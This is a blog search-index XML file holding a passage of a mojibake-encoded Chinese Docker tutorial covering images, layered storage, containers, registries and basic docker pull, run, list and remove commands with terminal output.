<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Dockerä»Žå…¥é—¨åˆ°å®žè·µ]]></title>
    <url>%2F2020-07-07-docker.html</url>
    <content type="text"><![CDATA[dockerå­¦ä¹ ï¼Œä½œè€…æºäºŽè¿™é‡Œ DockeråŸºæœ¬æ¦‚å¿µé•œåƒImageæ“ä½œç³»ç»Ÿåˆ†ä¸ºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´ï¼Œå†…æ ¸å¯åŠ¨åŽï¼Œä¼šæŒ‚è½½rootæ–‡ä»¶ç³»ç»Ÿä¸ºå…¶æä¾›ç”¨æˆ·ç©ºé—´æ”¯æŒã€‚dockeré•œåƒå°±ç›¸å½“äºŽæ˜¯ä¸€ä¸ªrootæ–‡ä»¶ç³»ç»Ÿã€‚ æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«ä¸€äº›ä¸ºè¿è¡Œå‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€çŽ¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸ä¼šåŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æž„å»ºä¹‹åŽä¹Ÿä¸ä¼šè¢«æ”¹å˜ åˆ†å±‚å­˜å‚¨é•œåƒåŒ…å«æ“ä½œç³»ç»Ÿå®Œæ•´çš„rootæ–‡ä»¶ç³»ç»Ÿï¼Œä½“ç§¯åºžå¤§ï¼Œåœ¨è®¾è®¡dockeræ—¶ï¼Œå°†å…¶è®¾è®¡ä¸ºåˆ†å±‚å­˜å‚¨æž¶æž„ã€‚ä¸¥æ ¼æ¥è¯´ï¼Œé•œåƒå¹¶éžåƒä¸€ä¸ªISOé‚£è¦çš„æ‰“åŒ…æ–‡ä»¶ï¼Œé•œåƒåªæ˜¯ä¸€ä¸ªè™šæ‹Ÿæ¦‚å¿µï¼Œå®žé™…ä½“çŽ°å¹¶éžç”±ä¸€ä¸ªæ–‡ä»¶ç»„æˆï¼Œè€Œæ˜¯ç”±ä¸€ç»„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œæˆ–è¯´æ˜¯å¤šå±‚æ–‡ä»¶ç³»ç»Ÿè”åˆç»„æˆã€‚ é•œåƒæž„å»ºæ—¶ï¼Œä¼šä¸€å±‚å±‚æž„å»ºï¼Œå‰ä¸€å±‚æ˜¯åŽä¸€å±‚çš„åŸºç¡€ï¼Œæ¯ä¸€å±‚æž„å»ºå®Œå°±ä¸ä¼šå†å‘ç”Ÿæ”¹å˜ï¼ŒåŽä¸€å±‚ä¸Šçš„ä»»ä½•æ”¹å˜åªå‘ç”Ÿåœ¨è‡ªå·±çš„è¿™ä¸€å±‚ã€‚ä¾‹å¦‚åˆ é™¤å‰ä¸€å±‚æ–‡ä»¶çš„æ“ä½œå¹¶ä¸æ˜¯çœŸçš„åˆ é™¤å‰ä¸€å±‚æ–‡ä»¶ï¼Œè€Œæ˜¯ä»…åœ¨å½“å‰å±‚æ ‡è®°ä¸ºè¯¥æ–‡ä»¶å·²çŠç‘šè™«ã€‚åœ¨æœ€ç»ˆå®¹å™¨è¿è¡Œæ—¶å€™ï¼Œè™½ç„¶ä¸ä¼šçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å®žé™…ä¸Šè¯¥æ–‡ä»¶ä¼šä¸€ç›´è·Ÿéšé•œåƒã€‚å› æ­¤åœ¨æž„å»ºé•œåƒçš„æ—¶å€™ï¼Œéœ€è¦é¢å¤–å°å¿ƒï¼Œæ¯ä¸€å±‚å°½é‡åªåŒ…å«è¯¥å±‚éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•é¢å¤–çš„ä¸œè¥¿åº”è¯¥åœ¨è¯¥å±‚æž„å»ºç»“æŸå‰æ¸…ç†æŽ‰ åˆ†å±‚å­˜å‚¨çš„ç‰¹æ€§è¿˜ä½¿å¾—é•œåƒçš„å¤ç”¨ã€å®šåˆ¶å˜å¾—æ›´åŠ å®¹æ˜“ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨ä¹‹å‰æž„å»ºå¥½çš„é•œåƒä½œä¸ºåŸºç¡€å±‚ï¼Œç„¶åŽè¿›ä¸€æ­¥æ·»åŠ æ–°çš„å±‚ï¼Œä»¥å®šåˆ¶è‡ªå·±æ‰€éœ€çš„å†…å®¹ï¼Œæž„å»ºæ–°çš„é•œåƒ å®¹å™¨Containeré•œåƒå’Œå®¹å™¨çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºä¸­çš„ç±»å’Œå®žä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®žä½“ã€‚å®¹æ˜“å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚ å®¹å™¨çš„å®žè´¨æ˜¯è¿›ç¨‹ï¼Œä½†ä¸Žç›´æŽ¥åœ¨å®¿ä¸»æ‰§è¡Œçš„è¿›ç¨‹ä¸åŒï¼Œå®¹å™¨è¿›ç¨‹è¿è¡Œå±žäºŽè‡ªå·±çš„ç‹¬ç«‹çš„å‘½åç©ºé—´ã€‚å› æ­¤å®¹å™¨å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„rootæ–‡ä»¶ç³»ç»Ÿã€è‡ªå·±çš„ç½‘ç»œé…ç½®ã€è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ï¼Œè®¾ç½®è‡ªå·±çš„ç”¨æˆ·IDç©ºé—´ã€‚å®¹å™¨å†…çš„è¿›ç¨‹æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªéš”ç¦»çš„çŽ¯å¢ƒé‡Œé¢ï¼Œä½¿ç”¨èµ·æ¥ï¼Œå°±å¥½åƒæ˜¯åœ¨ä¸€ä¸ªç‹¬ç«‹äºŽå®¿ä¸»çš„ç³»ç»Ÿä¸‹æ“ä½œä¸€æ ·ã€‚è¿™ç§ç‰¹æ€§ä½¿å¾—å®¹å™¨å°è£…çš„åº”ç”¨æ¯”ç›´æŽ¥åœ¨å®¿ä¸»è¿è¡Œæ›´åŠ å®‰å…¨ã€‚å› ä¸ºè¿™ç§éš”ç¦»ç‰¹æ€§ï¼Œå¸¸å¸¸ä¼šæ··æ·†å®¹å™¨å’Œè™šæ‹Ÿæœºã€‚ å®¹æ˜“ä¹Ÿæ˜¯åˆ†å±‚å­˜å‚¨ï¼Œæ¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œæ˜¯ä»¥é•œåƒä¸ºåŸºç¡€å±‚ï¼Œåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªå½“å‰å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œç§°è¿™ä¸ªä¸ºå®¹å™¨è¿è¡Œæ—¶è¯»å†™è€Œè£…å¤‡çš„å­˜å‚¨å±‚ä¸ºå®¹å™¨å­˜å‚¨å±‚ã€‚ å®¹å™¨å­˜å‚¨å±‚çš„ç”Ÿå­˜å‘¨æœŸå’Œå®¹å™¨ä¸€æ ·ï¼Œå®¹å™¨æ¶ˆäº¡æ—¶ï¼Œå®¹å™¨å­˜å‚¨å±‚éšä¹‹æ¶ˆäº¡ã€‚ä»»ä½•ä¿å­˜äºŽå®¹å™¨å­˜å‚¨å±‚çš„ä¿¡æ¯éƒ½ä¼šéšå®¹å™¨åˆ é™¤è€Œä¸¢å¤±ã€‚ æŒ‰ç…§æœ€ä½³å®žè·µçš„è¦æ±‚ï¼Œå®¹å™¨ä¸åº”è¯¥å‘å…¶å­˜å‚¨å±‚å†…å†™å…¥ä»»ä½•æ•°æ®ï¼Œå®¹å™¨å­˜å‚¨å±‚è¦ä¿æŒæ— çŠ¶æ€åŒ–ã€‚æ‰€æœ‰æ–‡ä»¶å†™å…¥æ“ä½œï¼Œéƒ½åº”è¯¥ä½¿ç”¨æ•°æ®å·ã€æˆ–è€…ç»‘å®šå®¿ä¸»ç›®å½•ï¼Œåœ¨è¿™äº›ä½ç½®çš„è¯»å†™ä¼šè·³è¿‡å®¹å™¨å­˜å‚¨å±‚ï¼Œç›´æŽ¥å¯¹å®¿ä¸»ï¼ˆæˆ–ç½‘ç»œå­˜å‚¨ï¼‰å‘ç”Ÿè¯»å†™ï¼Œå…¶æ€§èƒ½å’Œç¨³å®šæ€§æ›´é«˜ã€‚ æ•°æ®å·çš„ç”Ÿå­˜å‘¨æœŸç‹¬ç«‹å®¹å™¨ï¼Œä½¿ç”¨æ•°æ®å·åŽï¼Œå®¹å™¨åˆ é™¤æˆ–è€…é‡æ–°è¿è¡Œä¹‹åŽï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±ã€‚ ä»“åº“Repositoryé•œåƒæž„å»ºåŽï¼Œå®¹æ˜“åœ¨å½“å‰å®¿ä¸»æœºä¸Šè¿è¡Œï¼Œä½†æ˜¯å¦‚æžœéœ€è¦åœ¨å…¶ä»–æœåŠ¡å™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒï¼Œå°±éœ€è¦ä¸€ä¸ªé›†ä¸­çš„å­˜å‚¨ã€åˆ†å‘é•œåƒçš„æœåŠ¡ï¼Œdocker registerå°±æ˜¯è¿™æ ·çš„æœåŠ¡ã€‚ä¸€ä¸ªdocker regisertä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼Œä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾Tag,æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚ é€šå¸¸ä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºŽå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚å¯ä»¥é€šè¿‡&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;çš„æ ¼å¼æŒ‡å®šå…·ä½“è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æžœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥lasestä½œä¸ºé»˜è®¤ç‰ˆæœ¬ã€‚ ä½¿ç”¨é•œåƒèŽ·å–é•œåƒ docker pull [é€‰é¡¹] [Docker Register åœ°å€[:ç«¯å£å·]/]ä»“åº“å[:æ ‡ç­¾] å¯é€šè¿‡docker pull --helpå‘½ä»¤çœ‹åˆ°ã€‚é•œåƒåç§°æ ¼å¼ï¼š Docker é•œåƒä»“åº“åœ°å€ï¼šåœ°å€çš„åç§°ä¸€èˆ¬æ˜¯&lt;åŸŸå/IP&gt;[:ç«¯å£å·]é»˜è®¤åœ°å€æ˜¯Docker Hub ä»“åº“åï¼šä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³&lt;ç”¨æˆ·å&gt;/&lt;è½¯ä»¶å&gt;ã€‚å¯¹äºŽDocker Hubä¸ç»™å‡ºç”¨æˆ·åï¼Œé»˜è®¤å°±æ˜¯ libraryï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é•œåƒ ä¾‹å¦‚ï¼š 123456789[1;32mdocker@default[0m:[1;34m~[0m$ docker pull ubuntu:16.0416.04: Pulling from library/ubuntu[1B8bd67045: Pulling fs layer[1Be4862c05: Pulling fs layer[1B8949dcb1: Pulling fs layer[1BDigest: sha256:69bc24edd22c270431d1a9e6dbf57cfc4a77b2da199462d0251b145fdd7fa538Status: Downloaded newer image for ubuntu:16.04 ä¸Šé¢å‘½ä»¤æ²¡æœ‰ç»™å‡ºdockeré•œåƒä»“åº“åœ°å€ï¼Œä¼šä»ŽDocker HubèŽ·å–é•œåƒï¼Œé•œåƒåç§°æ˜¯ubuntu:16.04,å› æ­¤èŽ·å–å®˜æ–¹é•œåƒlibrary/ubuntuï¼Œä»“åº“ä¸­æ ‡ç­¾ä¸º 16.04çš„é•œåƒ ä¸‹è½½è¿‡ç¨‹ä¸­å¯ä»¥çœ‹å‡ºåˆ†å±‚å­˜å‚¨æ¦‚å¿µï¼Œé•œåƒç”±å¤šå±‚å­˜å‚¨æ‰€æž„æˆï¼Œä¸‹è½½ä¹Ÿæ˜¯ä¸€å±‚å±‚çš„åŽ»ä¸‹è½½ï¼Œå¹¶éžå•ä¸€æ–‡ä»¶ã€‚ä¸‹è½½è¿‡ç¨‹ä¸­ç»™å‡ºæ¯ä¸€å±‚IDçš„å‰12ä½ï¼Œå¹¶ä¸”ä¸‹è½½ç»“æŸåŽï¼Œç»™å‡ºè¯¥é•œåƒsha256çš„å®Œæ•´æ‘˜è¦ï¼Œä»¥ç¡®ä¿ä¸‹è½½ä¸€è‡´æ€§ è¿è¡Œä»¥é•œåƒä¸ºåŸºç¡€å¯åŠ¨å¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œå¯åŠ¨é‡Œé¢çš„bashå¹¶é•œåƒäº¤äº’æ“ä½œ 1234567891011121314151617[1;32mdocker@default[0m:[1;34m~[0m$ [Kdocker run -it --rm ubuntu:16.04 bash# æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬[K]0;root@0d248af097b5: /root@0d248af097b5:/# cat /etc/os-releaseNAME="Ubuntu"VERSION="16.04.6 LTS (Xenial Xerus)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 16.04.6 LTS"VERSION_ID="16.04"HOME_URL="http://www.ubuntu.com/"SUPPORT_URL="http://help.ubuntu.com/"BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"VERSION_CODENAME=xenialUBUNTU_CODENAME=xenial# é€€å‡º]0;root@0d248af097b5: /root@0d248af097b5:/# exitexit docker runæ˜¯å®¹å™¨è¿è¡Œçš„å‘½ä»¤ï¼š -it:è¿™æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä¹Ÿç»™æ˜¯-iï¼Œäº¤äº’å¼æ“ä½œï¼Œä¸€ä¸ªæ˜¯-tç»ˆç«¯ã€‚è¿›å…¥bashæ‰§è¡Œä¸€äº›å‘½ä»¤å¹¶æŸ¥çœ‹è¿”å›žç»“æžœï¼Œå› æ­¤éœ€è¦äº¤äº’å¼ç»ˆç«¯ --rmï¼šå®¹å™¨é€€å‡ºåŽéšä¹‹å°†å…¶åˆ é™¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†æŽ’éšœéœ€æ±‚ï¼Œé€€å‡ºçš„å®¹å™¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤ï¼Œé™¤éžæ‰‹åŠ¨docker rmã€‚è¿™é‡Œä½¿ç”¨ --rmå¯ä»¥é¿å…æµªè´¹ç©ºé—´ï¼Œåªæ˜¯éšä¾¿æ‰§è¡Œä¸ªå‘½ä»¤ï¼ŒæŸ¥çœ‹ç»“æžœï¼Œä¸éœ€è¦æŽ’éšœå’Œä¿ç•™ç»“æžœ ubuntu:16.64ï¼šè¿™æ˜¯ç”¨è¿™ä¸ªé•œåƒä¸ºåŸºç¡€æ¥å¯åŠ¨å®¹å™¨ bashï¼šåœ¨é•œåƒåŽçš„æ˜¯å‘½ä»¤ï¼Œå¸Œæœ›æœ‰ä¸ªäº¤äº’å¼çš„shellï¼Œä½¿ç”¨çš„æ˜¯bash åˆ—å‡ºé•œåƒdocker image ls 12345[1;32mdocker@default[0m:[1;34m~[0m$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 16.04 c522ac0d6194 8 hours ago 126MBnginx latest 2622e6cca7eb 3 weeks ago 132MBhello-world latest fce289e99eb9 18 months ago 1.84kB åˆ—è¡¨åŒ…å«äº†ä»“åº“åã€æ ‡ç­¾ã€é•œåƒIDã€åˆ›å»ºæ—¶é—´ä»¥åŠæ‰€å ç©ºé—´ã€‚ é•œåƒIDæ˜¯é•œåƒçš„å”¯ä¸€æ ‡è¯†ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥å¯¹åº”å¤šä¸ªæ ‡ç­¾ã€‚ é•œåƒä½“ç§¯è¿™é‡Œæ ‡è¯†æ‰€å çš„ç©ºé—´å’Œåœ¨Docker Hubä¸Šçœ‹åˆ°çš„é•œåƒå¤§å°ä¸ä¸€æ ·ï¼Œè¿™æ˜¯å› ä¸ºDocker Hubä¸­æ˜¾ç¤ºçš„ä½“ç§¯æ˜¯åŽ‹ç¼©åŽçš„ä½“ç§¯ã€‚åœ¨é•œåƒä¸‹è½½å’Œä¸Šä¼ è¿‡ç¨‹ä¸­é•œåƒæ€»æ˜¯ä¿æŒç€åŽ‹ç¼©çŠ¶æ€ï¼Œå› æ­¤Docker Hubä¸­æ˜¾ç¤ºçš„å¤§å°æ˜¯ç½‘ç»œä¼ è¾“ä¸­æ›´å…³å¿ƒçš„æµé‡å¤§å°ï¼Œè€Œdocker image lsæ˜¾ç¤ºçš„æ˜¯é•œåƒä¸‹è½½åˆ°æœ¬åœ°åŽå±•å¼€çš„å¤§å°ï¼Œæ˜¯å±•å¼€åŽçš„å„å±‚æ‰€å ç©ºé—´çš„æ€»å’Œï¼Œå› æ­¤é•œåƒåˆ°æœ¬åœ°åŽï¼ŒæŸ¥çœ‹ç©ºé—´çš„æ—¶å€™ï¼Œæ›´å…³å¿ƒçš„æ˜¯æœ¬åœ°ç£ç›˜ç©ºé—´æ‰€ç”¨çš„å¤§å°ã€‚ åˆ—è¡¨ä¸­çš„é•œåƒä½“ç§¯æ€»å’Œå¹¶éžæ˜¯æ‰€æœ‰é•œåƒå®žé™…ç¡¬ç›˜æ¶ˆè€—ï¼Œç”±äºŽdocker é•œåƒæ˜¯å¤šå±‚å­˜å‚¨ç»“æž„ï¼Œå¹¶ä¸”å¯ä»¥ç»§æ‰¿ã€å¤ç”¨ï¼Œå› æ­¤ä¸åŒé•œåƒå¯èƒ½ä¼šå› ä¸ºä½¿ç”¨ç›¸åŒçš„åŸºç¡€é•œåƒï¼Œä»Žè€Œæ‹¥æœ‰å…±åŒçš„å±‚ã€‚ç”±äºŽDockerä½¿ç”¨UnionFSï¼Œç›¸åŒå±‚åªéœ€è¦ä¿å­˜ä¸€ä»½å³å¯ï¼Œå› æ­¤å®žé™…é•œåƒç¡¬ç›˜å ç”¨ç©ºé—´å¾ˆå¯èƒ½è¦æ¯”è¿™ä¸ªåˆ—è¡¨é•œåƒå¤§å°çš„æ€»å’Œè¦å°çš„å¤šã€‚ ä½¿ç”¨ docker system dfæŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´ 123456[1;32mdocker@default[0m:[1;34m~[0m$ docker system dfTYPE TOTAL ACTIVE SIZE RECLAIMABLEImages 3 1 258.2MB 258.2MB (99%)Containers 1 0 0B 0BLocal Volumes 0 0 0B 0BBuild Cache 0 0 0B 0B è™šæ‚¬é•œåƒæœ‰æ—¶å€™ä¼šç‰¹æ®Šé•œåƒï¼Œæ—¢æ²¡æœ‰ä»“åº“åï¼Œä¹Ÿæ²¡æœ‰æ ‡ç­¾ï¼Œä¸ºnone 1&lt;none&gt; &lt;none&gt; 09089dhs989 5 days ago 23MB è¿™äº›é•œåƒåŽŸæ¥æ˜¯é•œåƒåå’Œæ ‡ç­¾çš„ï¼Œéšç€å®˜æ–¹é•œåƒç»´æŠ¤å‘å¸ƒæ–°ç‰ˆæœ¬ï¼Œé‡æ–°pullè¿™ä¸ªé•œåƒï¼Œé•œåƒåè¢«è½¬ç§»åˆ°äº†æ–°ä¸‹è½½çš„é•œåƒä¸Šï¼Œè€Œæ—§çš„é•œåƒä¸Šçš„åç§°åˆ™è¢«å–æ¶ˆï¼Œä»Žè€Œæˆä¸ºäº†&lt;none&gt;ã€‚docker buildä¹Ÿå¯èƒ½å¯¼è‡´è¿™æ ·çš„é—®é¢˜ã€‚ç”±äºŽæ–°æ—§é•œåƒåŒåï¼Œæ—§é•œåƒåç§°è¢«å–æ¶ˆï¼Œä»Žè€Œä»“åº“åã€æ ‡ç­¾å‡ä¸º&lt;none&gt;ã€‚è¿™ç±»æ— æ ‡ç­¾é•œåƒä¹Ÿè¢«æˆä¸ºè™šæ‚¬é•œåƒï¼ˆdangling imageï¼‰,å¯ä»¥ç”¨docker image ls -f dangling=trueæ˜¾ç¤ºè¿™äº›é•œåƒ è™šæ‚¬é•œåƒä¹Ÿæ˜¯å¤±åŽ»äº†å­˜åœ¨ä»·å€¼ï¼Œå¯ä»¥éšæ„åˆ é™¤ï¼Œç”¨docker image pruneåˆ é™¤ ä¸­é—´å±‚é•œåƒä¸ºäº†åŠ é€Ÿé•œåƒæž„å»ºã€é‡å¤åˆ©ç”¨èµ„æºï¼ŒDockerä¼šåˆ©ç”¨ä¸­é—´é•œåƒï¼Œåœ¨ä½¿ç”¨ä¸€æ®µæ—¶é—´åŽï¼Œä¼šçœ‹åˆ°ä¸€äº›ä¾èµ–çš„ä¸­é—´é•œåƒã€‚é»˜è®¤çš„docker image lsåˆ—è¡¨åªä¼šæ˜¾ç¤ºé¡¶å±‚é•œåƒï¼Œå¦‚æžœå¸Œæœ›æ˜¾ç¤ºä¸­é—´å±‚é•œåƒåœ¨å†…çš„æ‰€æœ‰é•œåƒçš„è¯ï¼Œç”¨docker image ls -a å‡ºçŽ°æ— æ ‡ç­¾é•œåƒï¼Œä¸Žè™šæ‚¬é•œåƒä¸åŒï¼Œè¿™äº›é•œåƒéƒ½æ˜¯ä¸­é—´å±‚é•œåƒï¼Œæ˜¯å…¶ä»–é•œåƒæ‰€ä¾èµ–çš„é•œåƒï¼Œåˆ é™¤è¿™äº›é•œåƒä¼šå¯¼è‡´ä¸Šå±‚é•œåƒå› ä¸ºä¾èµ–ä¸¢å¤±å‡ºé”™ã€‚åˆ é™¤é‚£äº›ä¾èµ–å®ƒä»¬çš„é•œåƒåŽï¼Œè¿™äº›ä¾èµ–çš„ä¸­é—´å±‚é•œåƒä¹Ÿä¼šè¢«è¿žå¸¦åˆ é™¤ åˆ—å‡ºéƒ¨åˆ†é•œåƒ12345678910111213# æ ¹æ®ä»“åº“ådocker image ls ubuntu# æŒ‡å®šä»“åº“åå’Œæ ‡ç­¾docker image ls ubuntu:16.04# è¿‡æ»¤å™¨å‚æ•°--filter,ç®€å†™-f,å¸Œæœ›çœ‹åˆ°åœ¨mongo:3.2ä¹‹åŽå»ºç«‹çš„é•œåƒdocker image ls -f since=mongo:3.2# ä¹‹å‰åˆ™æ˜¯ç”¨before# å¦‚æžœé•œåƒæž„å»ºæ—¶ï¼Œå®šä¹‰äº†LABEL,å¯é€šè¿‡LABELè¿‡æ»¤docker image ls -f label=com.example.version=0.1 ç‰¹å®šæ ¼å¼æ˜¾ç¤º123456789101112131415# å°†æ‰€æœ‰é•œåƒçš„IDåˆ—å‡ºdocker image ls -q# åˆ—å‡ºé•œåƒç»“æžœåªåŒ…å«é•œåƒIDå’Œä»“åº“åï¼Œä½¿ç”¨äº†GOæ¨¡æ¿è¯­æ³•docker image ls --format "&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;"c522ac0d6194: ubuntu2622e6cca7eb: nginxfce289e99eb9: hello-world# ä»¥è¡¨æ ¼ç­‰è·æ˜¾ç¤ºï¼Œå¹¶ä¸”æœ‰æ ‡é¢˜è¡Œï¼Œå’Œé»˜è®¤ä¸€æ ·ï¼Œä¸è¿‡è‡ªå·±å®šä¹‰åˆ—docker image ls --format "table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;"IMAGE ID REPOSITORY TAGc522ac0d6194 ubuntu 16.042622e6cca7eb nginx latestfce289e99eb9 hello-world latest åˆ é™¤æœ¬åœ°é•œåƒ1docker image rm [é€‰é¡¹] &lt;é•œåƒ1&gt;[&lt;é•œåƒ2&gt;...] IDã€é•œåƒåã€æ‘˜è¦åˆ é™¤é•œåƒ é•œåƒå¯ä»¥æ˜¯çŸ­id,é•¿id,é•œåƒåæˆ–è€…é•œåƒæ‘˜è¦ï¼ŒçŸ­idå–å‰3ä¸ªå­—ç¬¦ä»¥ä¸Šï¼Œèƒ½åŒºåˆ†åˆ«çš„é•œåƒå°±å¯ä»¥ 12345678910111213141516docker image rm 502# ç”¨é•œåƒåï¼Œ&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;docker image rm centos# æ˜¾ç¤ºé•œåƒæ‘˜è¦docker image ls --digests# ä½¿ç”¨é•œåƒæ‘˜è¦åˆ é™¤é•œåƒdocker image rm node@sha256:b4f0e0bdeb578043c1ea6862f0d40cc4afe32a4a582f3be235a3b164422be228# åˆ é™¤æ‰€æœ‰ä»“åº“åä¸ºredisçš„é•œåƒdocker image rm $(docker image ls -q redis)# åˆ é™¤æ‰€åœ¨mongo:3.2ä¹‹å‰çš„é•œåƒdocker image rm$(docker image ls -q -f before=mongo:3.2) Untaggedå’ŒDeletedåˆ é™¤è¡Œä¸ºåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯untaggedï¼Œä¸€ç§æ˜¯deletedã€‚é•œåƒçš„å”¯ä¸€æ ‡è¯†æ˜¯å…¶IDå’Œæ‘˜è¦ï¼Œè€Œä¸€ä¸ªæƒŠå–œå¯ä»¥æœ‰å¤šä¸ªæ ‡ç­¾ã€‚å½“æˆ‘ä»¬åˆ é™¤æŒ‡å®šæ ‡ç­¾åŽï¼Œå¯èƒ½è¿˜æœ‰åˆ«çš„æ ‡ç­¾æŒ‡å‘è¿™ä¸ªé•œåƒï¼Œé‚£ä¹ˆdeleteè¡Œä¸ºä¸ä¼šå‘ç”Ÿï¼Œä¼šæ˜¾ç¤ºuntaggedä¿¡æ¯ã€‚ å½“è¯¥é•œåƒæ‰€æœ‰æ ‡ç­¾éƒ½è¢«å–æ¶ˆäº†ï¼Œæ”¹é•œåƒå¯èƒ½å°±å¤±åŽ»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œå› æ­¤ä¼šè§¦å‘åˆ é™¤è¡Œä¸ºã€‚é•œåƒæ˜¯å¤šå±‚å­˜å‚¨ç»“æž„ï¼Œåœ¨åˆ é™¤çš„æ—¶å€™ä¹Ÿæ˜¯ä»Žä¸Šå±‚å‘åŸºç¡€å±‚æ–¹æ³•ä¾æ¬¡è¿›è¡Œåˆ¤æ–­åˆ é™¤ã€‚é•œåƒçš„å¤šå±‚ç»“æž„ä½¿å¾—å¤ç”¨å˜åŠ¨é•œåƒå®¹æ˜“ï¼Œå› æ­¤å¾ˆæœ‰å¯èƒ½æŸä¸ªå…¶ä»–é•œåƒæ­£ä¾èµ–å½“å‰é•œåƒçš„æŸä¸€å±‚ã€‚è¿™ç§æƒ…å†µä¸ä¼šè§¦å‘åˆ é™¤è¯¥å±‚è¡Œä¸ºã€‚ç›´åˆ°æ²¡æœ‰ä»»ä½•å±‚ä¾èµ–å½“å‰å±‚æ—¶ï¼Œæ‰ä¼šçœŸå®žåˆ é™¤å½“å‰å±‚ã€‚ é™¤äº†é•œåƒä¾èµ–è¿˜æœ‰å®¹å™¨å¯¹é•œåƒçš„ä¾èµ–ã€‚å¦‚æžœæœ‰ç”¨è¿™ä¸ªé•œåƒå¯åŠ¨çš„å®¹å™¨å­˜åœ¨ï¼Œå³ä½¿å®¹å™¨æ²¡æœ‰è¿è¡Œï¼Œé‚£ä¹ˆåŒæ ·ä¸å¯ä»¥åˆ é™¤è¿™ä¸ªé•œåƒã€‚å®¹å™¨æ˜¯ä»¥ç»ä¸ºåŸºç¡€ï¼Œå†åŠ ä¸€å±‚å®¹å™¨å­˜å‚¨å±‚ï¼Œç»„æˆè¿™æ ·çš„å¤šå±‚å­˜å‚¨ç»“æž„åŽ»è¿è¡Œã€‚å› æ­¤è¯¥é•œåƒå¦‚æžœè¢«è¿™ä¸ªå®¹å™¨æ‰€ä¾èµ–ï¼Œé‚£ä¹ˆåˆ é™¤å¿…ç„¶ä¼šå¯¼è‡´æ•…éšœã€‚å¦‚æžœè¿™äº›å®¹å™¨æ˜¯ä¸éœ€è¦çš„ï¼Œåº”è¯¥å…ˆå°†å®ƒä»¬åˆ é™¤ï¼Œç„¶åŽæ¥åˆ é™¤é•œåƒã€‚ åˆ©ç”¨commitç†è§£é•œåƒæž„æˆé•œåƒæ˜¯å®¹å™¨çš„åŸºç¡€ï¼Œæ¯æ¬¡æ‰§è¡Œdocker runçš„æ—¶å€™éƒ½ä¼šæŒ‡å®šå“ªä¸ªé•œåƒä½œä¸ºå®¹å™¨è¿è¡Œçš„åŸºç¡€ã€‚å½“Docker Hubçš„é•œåƒæ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦å®šåˆ¶é•œåƒã€‚ å®šåˆ¶WebæœåŠ¡å™¨ä¸ºä¾‹å­ 12345678# nginxé•œåƒå¯ç”¨ä¸€ä¸ªå®¹å™¨ï¼Œå‘½åä¸ºwebserver,æ˜ å°„80ç«¯å£ï¼Œåœ¨æµè§ˆå™¨å¯ä»¥è®¿é—®è¿™ä¸ªnginxæœåŠ¡å™¨docker run --name webserver -d -p 80:80 nginx# 